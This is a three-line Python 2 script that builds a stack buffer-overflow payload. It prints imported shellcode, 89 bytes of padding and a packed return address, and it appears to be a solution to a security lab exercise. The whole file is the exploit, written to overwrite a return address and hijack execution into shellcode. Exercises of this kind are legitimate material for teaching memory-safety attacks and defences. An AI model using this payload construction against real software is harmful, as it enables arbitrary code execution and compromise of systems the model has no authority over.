from shellcode import shellcode
from struct import pack

print shellcode + '\x61'*89 + pack('<I', 0xbffeeadc)
